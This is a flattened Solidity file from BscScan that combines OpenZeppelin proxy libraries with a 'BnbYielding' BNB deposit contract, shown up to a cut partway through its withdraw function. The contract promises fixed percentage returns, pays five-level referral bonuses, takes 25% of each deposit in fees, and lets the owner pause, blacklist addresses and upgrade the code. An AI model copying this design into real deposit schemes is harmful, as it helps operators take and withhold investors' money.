/**
 *Submitted for verification at BscScan.com on 2022-03-23
*/

pragma solidity ^0.8.0;

/**
 * @dev This abstract contract provides a fallback function that delegates all calls to another contract using the EVM
 * instruction `delegatecall`. We refer to the second contract as the _implementation_ behind the proxy, and it has to
 * be specified by overriding the virtual {_implementation} function.
 *
 * Additionally, delegation to the implementation can be triggered manually through the {_fallback} function, or to a
 * different contract through the {_delegate} function.
 *
 * The success and return data of the delegated call will be returned back to the caller of the proxy.
 */
abstract contract Proxy {
    /**
     * @dev Delegates the current call to `implementation`.
     *
     * This function does not return to its internall call site, it will return directly to the external caller.
     */
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            // Copy msg.data. We take full control of memory in this inline assembly
            // block because it will not return to Solidity code. We overwrite the
            // Solidity scratch pad at memory position 0.
            calldatacopy(0, 0, calldatasize())

            // Call the implementation.
            // out and outsize are 0 because we don't know the size yet.
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)

            // Copy the returned data.
            returndatacopy(0, 0, returndatasize())

            switch result
            // delegatecall returns 0 on error.
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    /**
     * @dev This is a virtual function that should be overriden so it returns the address to which the fallback function
     * and {_fallback} should delegate.
     */
    function _implementation() internal view virtual returns (address);

    /**
     * @dev Delegates the current call to the address returned by `_implementation()`.
     *
     * This function does not return to its internall call site, it will return directly to the external caller.
     */
    function _fallback() internal virtual {
        _beforeFallback();
        _delegate(_implementation());
    }

    /**
     * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if no other
     * function in the contract matches the call data.
     */
    fallback () external payable virtual {
        _fallback();
    }

    /**
     * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if call data
     * is empty.
     */
    receive () external payable virtual {
        _fallback();
    }

    /**
     * @dev Hook that is called before falling back to the implementation. Can happen as part of a manual `_fallback`
     * call, or as part of the Solidity `fallback` or `receive` functions.
     *
     * If overriden should call `super._beforeFallback()`.
     */
    function _beforeFallback() internal virtual {
    }
}

// File: ../../../.brownie/packages/OpenZeppelin/[email protected]/contracts/proxy/beacon/IBeacon.sol


pragma solidity ^0.8.0;

/**
 * @dev This is the interface that {BeaconProxy} expects of its beacon.
 */
interface IBeacon {
    /**
     * @dev Must return an address that can be used as a delegate call target.
     *
     * {BeaconProxy} will check that this address is a contract.
     */
    function implementation() external view returns (address);
}

// File: ../../../.brownie/packages/OpenZeppelin/[email protected]/contracts/utils/Address.sol


pragma solidity ^0.8.0;

/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.

        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain`call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a delegate call.
     *
     * _Available since v3.4._
     */
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

// File: ../../../.brownie/packages/OpenZeppelin/[email protected]/contracts/utils/StorageSlot.sol


pragma solidity ^0.8.0;

/**
 * @dev Library for reading and writing primitive types to specific storage slots.
 *
 * Storage slots are often used to avoid storage conflict when dealing with upgradeable contracts.
 * This library helps with reading and writing to such slots without the need for inline assembly.
 *
 * The functions in this library return Slot structs that contain a `value` member that can be used to read or write.
 *
 * Example usage to set ERC1967 implementation slot:
 * ```
 * contract ERC1967 {
 *     bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
 *
 *     function _getImplementation() internal view returns (address) {
 *         return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;
 *     }
 *
 *     function _setImplementation(address newImplementation) internal {
 *         require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
 *         StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value = newImplementation;
 *     }
 * }
 * ```
 *
 * _Available since v4.1 for `address`, `bool`, `bytes32`, and `uint256`._
 */
library StorageSlot {
    struct AddressSlot {
        address value;
    }

    struct BooleanSlot {
        bool value;
    }

    struct Bytes32Slot {
        bytes32 value;
    }

    struct Uint256Slot {
        uint256 value;
    }

    /**
     * @dev Returns an `AddressSlot` with member `value` located at `slot`.
     */
    function getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r.slot := slot
        }
    }

    /**
     * @dev Returns an `BooleanSlot` with member `value` located at `slot`.
     */
    function getBooleanSlot(bytes32 slot) internal pure returns (BooleanSlot storage r) {
        assembly {
            r.slot := slot
        }
    }

    /**
     * @dev Returns an `Bytes32Slot` with member `value` located at `slot`.
     */
    function getBytes32Slot(bytes32 slot) internal pure returns (Bytes32Slot storage r) {
        assembly {
            r.slot := slot
        }
    }

    /**
     * @dev Returns an `Uint256Slot` with member `value` located at `slot`.
     */
    function getUint256Slot(bytes32 slot) internal pure returns (Uint256Slot storage r) {
        assembly {
            r.slot := slot
        }
    }
}

// File: ../../../.brownie/packages/OpenZeppelin/[email protected]/contracts/proxy/ERC1967/ERC1967Upgrade.sol


pragma solidity ^0.8.2;




/**
 * @dev This abstract contract provides getters and event emitting update functions for
 * https://eips.ethereum.org/EIPS/eip-1967[EIP1967] slots.
 *
 * _Available since v4.1._
 *
 * @custom:oz-upgrades-unsafe-allow delegatecall
 */
abstract contract ERC1967Upgrade {
    // This is the keccak-256 hash of "eip1967.proxy.rollback" subtracted by 1
    bytes32 private constant _ROLLBACK_SLOT = 0x4910fdfa16fed3260ed0e7147f7cc6da11a60208b5b9406d12a635614ffd9143;

    /**
     * @dev Storage slot with the address of the current implementation.
     * This is the keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1, and is
     * validated in the constructor.
     */
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    /**
     * @dev Emitted when the implementation is upgraded.
     */
    event Upgraded(address indexed implementation);

    /**
     * @dev Returns the current implementation address.
     */
    function _getImplementation() internal view returns (address) {
        return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;
    }

    /**
     * @dev Stores a new address in the EIP1967 implementation slot.
     */
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
        StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value = newImplementation;
    }

    /**
     * @dev Perform implementation upgrade
     *
     * Emits an {Upgraded} event.
     */
    function _upgradeTo(address newImplementation) internal {
        _setImplementation(newImplementation);
        emit Upgraded(newImplementation);
    }

    /**
     * @dev Perform implementation upgrade with additional setup call.
     *
     * Emits an {Upgraded} event.
     */
    function _upgradeToAndCall(address newImplementation, bytes memory data, bool forceCall) internal {
        _setImplementation(newImplementation);
        emit Upgraded(newImplementation);
        if (data.length > 0 || forceCall) {
            Address.functionDelegateCall(newImplementation, data);
        }
    }

    /**
     * @dev Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
     *
     * Emits an {Upgraded} event.
     */
    function _upgradeToAndCallSecure(address newImplementation, bytes memory data, bool forceCall) internal {
        address oldImplementation = _getImplementation();

        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0 || forceCall) {
            Address.functionDelegateCall(newImplementation, data);
        }

        // Perform rollback test if not already in progress
        StorageSlot.BooleanSlot storage rollbackTesting = StorageSlot.getBooleanSlot(_ROLLBACK_SLOT);
        if (!rollbackTesting.value) {
            // Trigger rollback using upgradeTo from the new implementation
            rollbackTesting.value = true;
            Address.functionDelegateCall(
                newImplementation,
                abi.encodeWithSignature(
                    "upgradeTo(address)",
                    oldImplementation
                )
            );
            rollbackTesting.value = false;
            // Check rollback was effective
            require(oldImplementation == _getImplementation(), "ERC1967Upgrade: upgrade breaks further upgrades");
            // Finally reset to the new implementation and log the upgrade
            _setImplementation(newImplementation);
            emit Upgraded(newImplementation);
        }
    }

    /**
     * @dev Perform beacon upgrade with additional setup call. Note: This upgrades the address of the beacon, it does
     * not upgrade the implementation contained in the beacon (see {UpgradeableBeacon-_setImplementation} for that).
     *
     * Emits a {BeaconUpgraded} event.
     */
    function _upgradeBeaconToAndCall(address newBeacon, bytes memory data, bool forceCall) internal {
        _setBeacon(newBeacon);
        emit BeaconUpgraded(newBeacon);
        if (data.length > 0 || forceCall) {
            Address.functionDelegateCall(IBeacon(newBeacon).implementation(), data);
        }
    }

    /**
     * @dev Storage slot with the admin of the contract.
     * This is the keccak-256 hash of "eip1967.proxy.admin" subtracted by 1, and is
     * validated in the constructor.
     */
    bytes32 internal constant _ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;

    /**
     * @dev Emitted when the admin account has changed.
     */
    event AdminChanged(address previousAdmin, address newAdmin);

    /**
     * @dev Returns the current admin.
     */
    function _getAdmin() internal view returns (address) {
        return StorageSlot.getAddressSlot(_ADMIN_SLOT).value;
    }

    /**
     * @dev Stores a new address in the EIP1967 admin slot.
     */
    function _setAdmin(address newAdmin) private {
        require(newAdmin != address(0), "ERC1967: new admin is the zero address");
        StorageSlot.getAddressSlot(_ADMIN_SLOT).value = newAdmin;
    }

    /**
     * @dev Changes the admin of the proxy.
     *
     * Emits an {AdminChanged} event.
     */
    function _changeAdmin(address newAdmin) internal {
        emit AdminChanged(_getAdmin(), newAdmin);
        _setAdmin(newAdmin);
    }

    /**
     * @dev The storage slot of the UpgradeableBeacon contract which defines the implementation for this proxy.
     * This is bytes32(uint256(keccak256('eip1967.proxy.beacon')) - 1)) and is validated in the constructor.
     */
    bytes32 internal constant _BEACON_SLOT = 0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50;

    /**
     * @dev Emitted when the beacon is upgraded.
     */
    event BeaconUpgraded(address indexed beacon);

    /**
     * @dev Returns the current beacon.
     */
    function _getBeacon() internal view returns (address) {
        return StorageSlot.getAddressSlot(_BEACON_SLOT).value;
    }

    /**
     * @dev Stores a new beacon in the EIP1967 beacon slot.
     */
    function _setBeacon(address newBeacon) private {
        require(
            Address.isContract(newBeacon),
            "ERC1967: new beacon is not a contract"
        );
        require(
            Address.isContract(IBeacon(newBeacon).implementation()),
            "ERC1967: beacon implementation is not a contract"
        );
        StorageSlot.getAddressSlot(_BEACON_SLOT).value = newBeacon;
    }
}

// File: ../../../.brownie/packages/OpenZeppelin/[email protected]/contracts/proxy/ERC1967/ERC1967Proxy.sol


pragma solidity ^0.8.0;



/**
 * @dev This contract implements an upgradeable proxy. It is upgradeable because calls are delegated to an
 * implementation address that can be changed. This address is stored in storage in the location specified by
 * https://eips.ethereum.org/EIPS/eip-1967[EIP1967], so that it doesn't conflict with the storage layout of the
 * implementation behind the proxy.
 */
contract ERC1967Proxy is Proxy, ERC1967Upgrade {
    /**
     * @dev Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
     *
     * If `_data` is nonempty, it's used as data in a delegate call to `_logic`. This will typically be an encoded
     * function call, and allows initializating the storage of the proxy like a Solidity constructor.
     */
    constructor(address _logic, bytes memory _data) payable {
        assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1));
        _upgradeToAndCall(_logic, _data, false);
    }

    /**
     * @dev Returns the current implementation address.
     */
    function _implementation() internal view virtual override returns (address impl) {
        return ERC1967Upgrade._getImplementation();
    }
}

// File: ../../../.brownie/packages/OpenZeppelin/[email protected]/contracts/proxy/transparent/TransparentUpgradeableProxy.sol

// ////-License-Identifier: MIT

pragma solidity ^0.8.0;


/**
 * @dev This contract implements a proxy that is upgradeable by an admin.
 *
 * To avoid https://medium.com/nomic-labs-blog/malicious-backdoors-in-ethereum-proxies-62629adf3357[proxy selector
 * clashing], which can potentially be used in an attack, this contract uses the
 * https://blog.openzeppelin.com/the-transparent-proxy-pattern/[transparent proxy pattern]. This pattern implies two
 * things that go hand in hand:
 *
 * 1. If any account other than the admin calls the proxy, the call will be forwarded to the implementation, even if
 * that call matches one of the admin functions exposed by the proxy itself.
 * 2. If the admin calls the proxy, it can access the admin functions, but its calls will never be forwarded to the
 * implementation. If the admin tries to call a function on the implementation it will fail with an error that says
 * "admin cannot fallback to proxy target".
 *
 * These properties mean that the admin account can only be used for admin actions like upgrading the proxy or changing
 * the admin, so it's best if it's a dedicated account that is not used for anything else. This will avoid headaches due
 * to sudden errors when trying to call a function from the proxy implementation.
 *
 * Our recommendation is for the dedicated account to be an instance of the {ProxyAdmin} contract. If set up this way,
 * you should think of the `ProxyAdmin` instance as the real administrative interface of your proxy.
 */
contract TransparentUpgradeableProxy is ERC1967Proxy {
    /**
     * @dev Initializes an upgradeable proxy managed by `_admin`, backed by the implementation at `_logic`, and
     * optionally initialized with `_data` as explained in {ERC1967Proxy-constructor}.
     */
    constructor(address _logic, address admin_, bytes memory _data) payable ERC1967Proxy(_logic, _data) {
        assert(_ADMIN_SLOT == bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1));
        _changeAdmin(admin_);
    }

    /**
     * @dev Modifier used internally that will delegate the call to the implementation unless the sender is the admin.
     */
    modifier ifAdmin() {
        if (msg.sender == _getAdmin()) {
            _;
        } else {
            _fallback();
        }
    }

    /**
     * @dev Returns the current admin.
     *
     * NOTE: Only the admin can call this function. See {ProxyAdmin-getProxyAdmin}.
     *
     * TIP: To get this value clients can read directly from the storage slot shown below (specified by EIP1967) using the
     * https://eth.wiki/json-rpc/API#eth_getstorageat[`eth_getStorageAt`] RPC call.
     * `0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103`
     */
    function admin() external ifAdmin returns (address admin_) {
        admin_ = _getAdmin();
    }

    /**
     * @dev Returns the current implementation.
     *
     * NOTE: Only the admin can call this function. See {ProxyAdmin-getProxyImplementation}.
     *
     * TIP: To get this value clients can read directly from the storage slot shown below (specified by EIP1967) using the
     * https://eth.wiki/json-rpc/API#eth_getstorageat[`eth_getStorageAt`] RPC call.
     * `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`
     */
    function implementation() external ifAdmin returns (address implementation_) {
        implementation_ = _implementation();
    }

    /**
     * @dev Changes the admin of the proxy.
     *
     * Emits an {AdminChanged} event.
     *
     * NOTE: Only the admin can call this function. See {ProxyAdmin-changeProxyAdmin}.
     */
    function changeAdmin(address newAdmin) external virtual ifAdmin {
        _changeAdmin(newAdmin);
    }

    /**
     * @dev Upgrade the implementation of the proxy.
     *
     * NOTE: Only the admin can call this function. See {ProxyAdmin-upgrade}.
     */
    function upgradeTo(address newImplementation) external ifAdmin {
        _upgradeToAndCall(newImplementation, bytes(""), false);
    }

    /**
     * @dev Upgrade the implementation of the proxy, and then call a function from the new implementation as specified
     * by `data`, which should be an encoded function call. This is useful to initialize new storage variables in the
     * proxied contract.
     *
     * NOTE: Only the admin can call this function. See {ProxyAdmin-upgradeAndCall}.
     */
    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable ifAdmin {
        _upgradeToAndCall(newImplementation, data, true);
    }

    /**
     * @dev Returns the current admin.
     */
    function _admin() internal view virtual returns (address) {
        return _getAdmin();
    }

    /**
     * @dev Makes sure the admin cannot access the fallback function. See {Proxy-_beforeFallback}.
     */
    function _beforeFallback() internal virtual override {
        require(msg.sender != _getAdmin(), "TransparentUpgradeableProxy: admin cannot fallback to proxy target");
        super._beforeFallback();
    }
}

// : MIT
    pragma solidity ^0.8.0;

    abstract contract Initializable {
        bool private _initialized;
        bool private _initializing;

        modifier initializer() {
            require(_initializing || !_initialized, "Initializable: contract is already initialized");
            bool isTopLevelCall = !_initializing;
            if (isTopLevelCall) {
                _initializing = true;
                _initialized = true;
            }
            _;
            if (isTopLevelCall) {
                _initializing = false;
            }
        }
    }

    abstract contract ContextUpgradeable is Initializable {
        function __Context_init() internal initializer {
            __Context_init_unchained();
        }

        function __Context_init_unchained() internal initializer {
        }
        function _msgSender() internal view virtual returns (address) {
            return msg.sender;
        }

        function _msgData() internal view virtual returns (bytes calldata) {
            return msg.data;
        }
        uint256[50] private __gap;
        }
        
        abstract contract PausableUpgradeable is Initializable, ContextUpgradeable {

        event Paused(address account);
        event Unpaused(address account);
        bool private _paused;

        function __Pausable_init() internal initializer {
            __Context_init_unchained();
            __Pausable_init_unchained();
        }

        function __Pausable_init_unchained() internal initializer {
            _paused = false;
        }

        function paused() public view virtual returns (bool) {
            return _paused;
        }

        modifier whenNotPaused() {
            require(!paused(), "Pausable: paused");
            _;
        }

        modifier whenPaused() {
            require(paused(), "Pausable: not paused");
            _;
        }

        function _pause() internal virtual whenNotPaused {
            _paused = true;
            emit Paused(_msgSender());
        }

        function _unpause() internal virtual whenPaused {
            _paused = false;
            emit Unpaused(_msgSender());
        }
        uint256[49] private __gap;
    }

    abstract contract OwnableUpgradeable is Initializable, ContextUpgradeable {
        address public _owner;
        event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

        function __Ownable_init() internal initializer {
            __Context_init_unchained();
            __Ownable_init_unchained();
        }

        function __Ownable_init_unchained() internal initializer {
            _setOwner(_msgSender());
        }

        function owner() public view virtual returns (address) {
            return _owner;
        }

        modifier onlyOwner() {
            require(owner() == _msgSender(), "Ownable: caller is not the owner");
            _;
        }

        function renounceOwnership() public virtual onlyOwner {
            _setOwner(address(0));
        }
        
        function transferOwnership(address newOwner) public virtual onlyOwner {
            require(newOwner != address(0), "Ownable: new owner is the zero address");
            _setOwner(newOwner);
        }

        function _setOwner(address newOwner) private {
            address oldOwner = _owner;
            _owner = newOwner;
            emit OwnershipTransferred(oldOwner, newOwner);
        }
        uint256[49] private __gap;
    }
    
    abstract contract ReentrancyGuard {
            uint256 private constant _NOT_ENTERED = 1;
            uint256 private constant _ENTERED = 2;
            uint256 private _status;
            constructor() {
                _status = _NOT_ENTERED;
            }
            modifier nonReentrant() {
                require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
                _status = _ENTERED;
                _;
                _status = _NOT_ENTERED;
            }
        }

        struct Tarif {
        uint8 life_days;
        uint256 percent;
        }

        struct Deposit {
        uint8 tarif;
        uint256 amount;
        uint40 time;
        }

        struct Investor {
        address upline;
        uint256 dividends;
        uint256 match_bonus;
        uint256 checkpoint;
        uint40  last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        bool bonus_deposit;
        uint256 amount_bonus_deposit;
        bool statusTaxWithdraw;
        uint256 whithdrawCount;
        Deposit[] deposits;
        }

        struct Investor_Vip {
        bool vip;
        uint256 TimeForWithdraw;
        uint256 FeeWithdraw;
        bool FeeWithdrawStatus;
        uint256 time_end;
        uint256 checkpointDep;
        uint256 reffCount;
        }

        contract BnbYielding is Initializable, PausableUpgradeable, OwnableUpgradeable, ReentrancyGuard{
            address private marketing_wallet;
            address private ceo;
            address private project;
            address payable public secure_wallet;
            uint256 private secure_fee;
            uint256 private marketing_fee;
            uint256 private ceoFee;
            uint256 private projectFee;

            uint256 public invested;
            uint256 public withdrawn;
            uint256 public secure_pool;
            uint256 public match_bonus;
            uint256 public totalInvestors;
            uint256 public TIME_STEP;
            uint256 public initUNIX;
        
            uint256 private MAX_DEPOSIT_BONUS_STEP_TIME;
            uint256 public USER_DEPOSITS_STEP; 
            uint256 private DEPOSIT_BONUS_PERCENT;
            uint256 private PRC_PARTN;
            uint256 private PRC_BONUS_HOLDER;
            uint256 private REINVEST_PERCENT;
            uint8 private TimeReInvest;

            uint256 public VIP_TARIF;
            uint256 public VIP_TARIF_PRICE;
            uint256 private VIP_WITHDRAW_TIME_STEP;
            uint256 private VIP_FeeWithdraw;

            uint256 private TaxWithdrawWhale;
            uint256 private TaxDepositWhale;
            uint256 private MAX_TaxWITHDRAW_COUNT;

            uint8   BONUS_LINES_COUNT;
            uint16  PERCENT_DIVIDER;
            uint256 private PERCENTS_DIVIDER;
            uint256 public MIN_WITHDRAW;
            uint256 public MAX_WITHDRAW;
            uint256 public INVEST_MIN_AMOUNT;
            uint8[5] public ref_bonuses;
            uint256 private tarifPercent;
            uint8   private accumulator;

            mapping(uint8 => Tarif) public tarifs;
            mapping(address => Investor) public investors;
            mapping(address => Investor_Vip) public investorsvip;
            mapping(address => bool) blacklist;
            mapping(address => bool) whitelist;

            event Upline(address indexed addr, address indexed upline, uint256 bonus);
            event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
            event MatchPayout(address indexed addr, address indexed from, uint256 amount);
            event Withdraw(address indexed addr, uint256 amount);

            function initialize(address payable _marketing_cost,address payable _secure_wallet,address payable _ceo,address payable _project) initializer public {
                __Ownable_init();
                __Pausable_init();
                uint256 timestamp = block.timestamp;
                initUNIX = timestamp;

                marketing_wallet = _marketing_cost;
                secure_wallet  = _secure_wallet;
                ceo  = _ceo;
                project  = _project;

                secure_fee = 100;
                marketing_fee = 40;
                ceoFee = 10;
                projectFee = 100;
                TIME_STEP = 1 days;
                MAX_DEPOSIT_BONUS_STEP_TIME = 5 days;
                USER_DEPOSITS_STEP = 10 ether; //once 10bnb deposits
                DEPOSIT_BONUS_PERCENT = 10 * 1e15; //1%
                PRC_PARTN = 10; //1% 
                PRC_BONUS_HOLDER = 10; //1%
                REINVEST_PERCENT = 100;
                TimeReInvest = 24;
                VIP_TARIF = 20; // 20 days hold
                VIP_TARIF_PRICE = 20 * 1e18; // access with 20bnb
                VIP_WITHDRAW_TIME_STEP = 1728000; // 20 days hold
                VIP_FeeWithdraw = 300; // 30% of fee for withdraw user vip
                TaxWithdrawWhale = 450; //45%
                TaxDepositWhale = 400; //40%
                MAX_TaxWITHDRAW_COUNT = 1;
                BONUS_LINES_COUNT = 5;
                PERCENT_DIVIDER = 1000;
                PERCENTS_DIVIDER = 1000;
                MIN_WITHDRAW = 0.1 ether;
                MAX_WITHDRAW = 5 ether;
                INVEST_MIN_AMOUNT = 0.1 ether;
                ref_bonuses = [30, 50, 60, 80, 100];

                tarifPercent = 175;
                accumulator = 5;
                for (uint8 tarifDuration = 10; tarifDuration <= 24; tarifDuration++) {
                    tarifs[tarifDuration] = Tarif(tarifDuration, tarifPercent);
                    tarifPercent+= accumulator;
                }
            }

            function pause() public onlyOwner {
            _pause();
            }

            function unpause() public onlyOwner {
            _unpause();
            }

            
            function deposit(uint8 _tarif, address _upline) external payable NonBlackListed whenNotPaused {
                require(!isContract(msg.sender) && msg.sender == tx.origin);
                require(tarifs[_tarif].life_days > 0, "Tarif not found");
                require(msg.value >= INVEST_MIN_AMOUNT, "Minimum deposit amount is 0.1 BNB");
                require(block.timestamp > initUNIX, "Not started yet");

                Investor storage investor = investors[msg.sender];
                Investor_Vip storage investorvip = investorsvip[msg.sender];
                require(investor.deposits.length < 100, "Max 100 deposits per address");
                _setUpline(msg.sender, _upline, msg.value);

                if (investor.deposits.length == 0) {
                    investor.checkpoint = block.timestamp;
                    totalInvestors++;
                }

                investor.deposits.push(Deposit({
                tarif: _tarif,
                amount: msg.value,
                time: uint40(block.timestamp)
                }));

                investor.total_invested += msg.value;
                invested += msg.value;
                _refPayout(msg.sender, msg.value);

                if(msg.value >= USER_DEPOSITS_STEP){
                    investor.bonus_deposit = true;
                    investor.amount_bonus_deposit = DEPOSIT_BONUS_PERCENT;
                }else {
                    investor.bonus_deposit = false;
                }

                if(_tarif == VIP_TARIF && msg.value >= VIP_TARIF_PRICE){
                    investorvip.vip = true;
                    investorvip.TimeForWithdraw = investor.checkpoint +  VIP_WITHDRAW_TIME_STEP;
                    if (msg.value >= VIP_TARIF_PRICE) {
                        investorvip.FeeWithdraw = VIP_FeeWithdraw + ((msg.value - VIP_TARIF_PRICE) / 1e18) * 10;
                    } 
                } else {
                    investorvip.vip = false;
                }

                if(msg.value >= MAX_WITHDRAW*TaxDepositWhale/(PERCENTS_DIVIDER)){
                    investor.statusTaxWithdraw = false;
                    investor.whithdrawCount = 0;
                }

                for(uint256 i = 0; i < investor.deposits.length; i++) {
                Deposit storage dep = investor.deposits[i];
                Tarif storage tarif = tarifs[dep.tarif];

                uint256 time_end = dep.time + tarif.life_days * TIME_STEP;
                investorvip.time_end = time_end;
                }

                investorvip.checkpointDep = block.timestamp;        
                payable(marketing_wallet).transfer(msg.value * marketing_fee/(PERCENTS_DIVIDER));
                payable(ceo).transfer(msg.value * ceoFee/(PERCENTS_DIVIDER));
                payable(project).transfer(msg.value * projectFee/(PERCENTS_DIVIDER));
                emit NewDeposit(msg.sender, msg.value, _tarif); 
            }

            function withdraw() external NonBlackListed whenNotPaused { 
                Investor storage investor = investors[msg.sender];
                Investor_Vip storage investorvip = investorsvip[msg.sender];
                _payout(msg.sender);

                require(investor.checkpoint + (TIME_STEP) < block.timestamp, "only once a day");
                require(investor.dividends > 0 || investor.match_bonus > 0, "Zero amount");
                
                if(block.timestamp < investorvip.TimeForWithdraw) {
